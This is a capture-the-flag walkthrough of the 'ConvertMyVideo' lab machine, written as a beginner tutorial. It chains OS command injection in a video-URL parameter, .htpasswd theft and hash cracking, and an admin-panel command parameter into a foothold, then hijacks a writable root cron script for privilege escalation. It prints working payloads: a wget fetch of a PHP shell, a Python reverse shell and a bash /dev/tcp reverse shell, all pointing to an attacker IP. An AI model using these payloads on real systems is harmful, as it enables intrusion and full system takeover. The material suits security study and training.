# ConvertMyVideo — Detailed Technical Notes 

**Author:** Obito Uchiha — Team AKATSUKI
**Topic:** OS Command Injection → RCE → Cron-based Privilege Escalation
**Target IP:** `10.48.149.233`

> Written as a complete beginner-to-finish walkthrough — assume the reader has never done a machine pentest before and is being taught step by step.

---

## 1. What is this challenge actually about?

Imagine a website that converts a YouTube video into an MP3. You paste a YouTube link, and somewhere on the backend a program (like `youtube-dl`) takes that link and runs it through a conversion tool.

The problem: if the developer never validated that link and instead dropped it straight into a terminal command, an attacker can replace the "URL" with their own system command. It's like telling a taxi driver your destination, but the driver blindly follows your entire sentence without checking it — so if you say "go to the mall, then also break into my house," the driver does both.

That's the heart of this challenge: **OS Command Injection** — user input flowing unsanitized into a shell command.

---

## 2. Core technologies and concepts used

| Technology / Concept | Role in this challenge |
|---|---|
| **Nmap** | Discovers open ports and running services |
| **ffuf** | Brute-forces hidden directories/files on the web server |
| **Burp Suite** | Intercepts and modifies HTTP requests/parameters |
| **Command Injection (`;`, `--`, `${IFS}`)** | Sneaking attacker-controlled commands into a backend shell call |
| **Apache `.htpasswd`** | Basic Authentication credential store — if leaked, grants direct login |
| **John the Ripper** | Cracks hashed passwords against a wordlist |
| **PHP web shell / Python reverse shell** | Upgrades one-shot command execution into a full interactive shell |
| **Cron jobs** | Linux's scheduled-task system — if a root-run script is writable by a low-privilege user, it's a privilege escalation path |

---

## 3. Vulnerabilities identified

1. **OS Command Injection** — the `yt_url` parameter is passed unsanitized into a shell command.
2. **Sensitive file disclosure via injection** — `.htpasswd` was read directly through the same command injection.
3. **Weak password** — `itsmeadmin`'s password (`jessie`) fell instantly to a dictionary attack.
4. **Unrestricted command execution in the admin panel** — the `/admin/?c=` parameter executes arbitrary shell commands with zero filtering.
5. **Insecure permissions + cron abuse** — `clean.sh` is executed by a root-owned scheduler but is writable by the low-privileged `www-data` account.

---

## 4. Beginner-to-challenge progression

**Step A — "What's even here?" (Recon)**
Nmap showed only two open ports: SSH (22) and HTTP (80). No SSH credentials were available, so the entire focus shifted to the web application.

**Step B — "What's hidden?" (Finding unlinked paths)**
`ffuf` was used to brute-force hidden directories. `/admin` appeared (password-protected, `401`), and `/tmp` appeared (a folder, `301`) — confirming an admin panel exists, but it's locked behind credentials we don't have yet.

**Step C — "Where is user input actually used?" (Finding the injection point)**
The site's main feature takes a YouTube URL and "processes" it. Whenever a feature takes user input and hands it to some backend processing step, always check whether that input lands directly in a shell command. Submitting `yt_url=--;id;` confirmed arbitrary command execution.

**Step D — "What else can this access give me?" (Lateral information gathering)**
Command injection isn't limited to running `id` — it can read any file the web server's user (`www-data`) can read. We used it to directly read the `.htpasswd` file, which stores the admin panel's hashed credentials.

**Step E — "Crack the hash into plaintext" (Credential recovery)**
`john` cracked the hash (`jessie`). This demonstrates that weak passwords fall almost immediately to dictionary attacks, hashed or not.

**Step F — "Get real access" (Login + bigger RCE)**
Logging into `/admin` with the recovered credentials revealed a second, more direct command-execution feature (`?c=`) — far more powerful than the first injection, since it had no filtering at all.

**Step G — "Build an interactive shell" (Foothold)**
One-off commands are limiting, so the `?c=` RCE was used first to stage a PHP web shell via `wget`, then to launch a Python reverse shell, handing us a full interactive terminal on our listener.

**Step H — "Grab the user flag, then hunt for root" (Privesc search)**
As `www-data`, the user flag was retrieved. SUID binaries were checked first but nothing exploitable was found, so attention shifted to scheduled tasks.

**Step I — "Who wrote it, who's running it?" (Spotting the permission mismatch)**
`/var/www/html/tmp/clean.sh` turned out to be writable by `www-data`. Its name and location strongly implied it was an automated cleanup script run periodically by root. This is the golden rule of privilege escalation: **if root executes a file you can edit, you can control what root does.**

**Step J — "Hijack the script" (Exploitation)**
The script's contents were overwritten with a reverse shell one-liner. When root's scheduler next executed it, we caught a root-level shell.

---

## 5. Full command walkthrough (with "why" explanations)

### 5.1 Full port scan

```bash
nmap -sS -p- --min-rate 2000 10.48.149.233 -vv -oN allPorts.txt
```

**Why:** `-p-` scans all 65,535 ports instead of just the top 1,000, so nothing hides on a non-default port. `--min-rate 2000` speeds up the scan.

**Result:**
```
22/tcp open  ssh
80/tcp open  http
```

### 5.2 Service and OS detection

```bash
nmap -sC -sV -p22,80 -O -T4 10.48.149.233 -vv -oN servicesVersionsAnsOS.txt
```

**Why:** `-sV` identifies exact software versions (Apache 2.4.29), `-sC` runs Nmap's default scripts, and `-O` attempts OS fingerprinting. This tells us the box is an older Ubuntu build, which hints at older/more vulnerable software.

### 5.3 Directory brute-force

```bash
ffuf -u http://10.48.149.233/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

**Why:** Not every path on a site is linked from the navigation. `ffuf` substitutes each wordlist entry into the URL and checks whether it resolves. `admin` (401 — protected) and `tmp` (301 — a real folder) both surfaced.

### 5.4 Command injection test

Using Burp Suite to intercept the conversion request, the `yt_url` parameter was modified to:

```
yt_url=--%3Bid%3B
```

(`%3B` is the URL-encoded form of `;`)

**Why this works:** If the backend is effectively running something like:

```bash
youtube-dl <yt_url>
```

then our input `-- ; id ;` breaks that command apart: `--` terminates the expected argument, `;` starts a brand-new shell command (`id`), and the trailing `;` closes it off. The response showing `uid=33(www-data)...` confirms our injected command executed.

### 5.5 Reading a sensitive file via injection

```
yt_url=--;cat${IFS}/var/www/html/admin/.htpasswd;/a
```

**Why `${IFS}` was used:** Many filters only block the literal space character. `${IFS}` (Internal Field Separator) behaves like a space in the shell, making it a common technique to bypass naive space-filtering.

**Result:**
```
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

### 5.6 Cracking the hash

```bash
echo 'itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/' > htpasswd.txt
john --format=md5crypt htpasswd.txt
```

**Why:** `$apr1$` identifies Apache's MD5-based crypt format. Telling `john` the format lets it run a dictionary attack efficiently. Result: password `jessie`.

### 5.7 Admin panel command execution

After logging in, clicking "Clear Downloads" revealed the underlying URL:

```
http://10.48.149.233/admin/?c=rm%20-rf%20/var/www/html/tmp/downloads
```

**Why this is a key discovery:** This means the `c` parameter is being passed directly to a backend shell function (like PHP's `exec()` or `system()`). We can replace its value with any command we want instead of `rm -rf`.

### 5.8 Staging a web shell

```
http://10.48.149.233/admin/?c=wget%20http://192.168.138.243/shell.php%20/var/www/html
```

**Why:** `wget` pulls a PHP shell from our attacking machine onto the target — a backup access method in case the direct reverse shell approach fails.

### 5.9 Python reverse shell

```
http://10.48.149.233/admin/?c=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.138.243",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

**Why each part matters:**
- `socket.connect(...)` — opens a TCP connection back to our attacking machine.
- `os.dup2(s.fileno(), 0/1/2)` — redirects the target's stdin, stdout, and stderr through that connection, so commands we type and output we receive flow over the network.
- `pty.spawn("/bin/bash")` — spins up a full bash shell controlled entirely through that connection.

Catch it with:
```bash
nc -lnvp 1234
```

### 5.10 Stabilizing the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# press Enter
export TERM=xterm
```

**Why:** A raw reverse shell is "dumb" — tab completion, Ctrl+C, and screen clearing don't work properly. These steps upgrade it into something that behaves like a real terminal.

### 5.11 User flag

```bash
cat flag.txt
```
```
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

### 5.12 SUID binary enumeration

```bash
find / -perm -4000 -type f 2>/dev/zero
```

**Why:** SUID-bit files run with their owner's privileges (often root). A misconfigured one (per GTFOBins) is an instant route to root. None were exploitable here — only standard system binaries were present.

### 5.13 Cron review

```bash
ls -la /etc/cron*
cat /etc/crontab
```

**Why:** Cron jobs are scheduled tasks frequently run as root. If a script executed by root can be edited by a lower-privileged account, that account can inject arbitrary commands into root's execution context.

### 5.14 Finding the vulnerable script

```bash
ls -la /var/www/html/tmp/clean.sh
```
```
-rw-r--r-- 1 www-data www-data 17 Apr 12 2020 /var/www/html/tmp/clean.sh
```

**Why this is critical:** The script is owned by `www-data` — our current user can write to it. Its name and location strongly suggest an automated cleanup job (likely run by root) periodically executes it. **Whenever "who can write it" and "who runs it" don't match, that's a privilege escalation opportunity.**

### 5.15 Hijacking the script

```bash
nc -lnvp 4444
```

On the target:
```bash
echo "bash -i >& /dev/tcp/192.168.138.243/4444 0>&1" > /var/www/html/tmp/clean.sh
```

**Why:** The script's entire content was overwritten with a reverse shell command. The next time root's scheduler runs this script, it executes our command with root privileges.

**Result (after ~60 seconds):**
```
root@dmv:/var/www/html/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

### 5.16 Root flag

```bash
cat /root/root.txt
```
```
flag{d9b368018e912b541a4eb68399c5e94a}
```

---

## 6. Key takeaway

This box teaches two very common real-world patterns:

1. **Whenever user input (like a URL) drives a "processing" or "conversion" feature, always check whether it ends up inside a shell command** — command injection shows up everywhere developers call `exec()`/`system()` with raw user input.
2. **The simplest privilege escalation pattern: look for a mismatch between "who can write it" and "who runs it."** If root executes a script that a lower-privileged user can modify, that script can be hijacked for a full privilege escalation.

---

*Notes by Obito Uchiha — Team AKATSUKI*
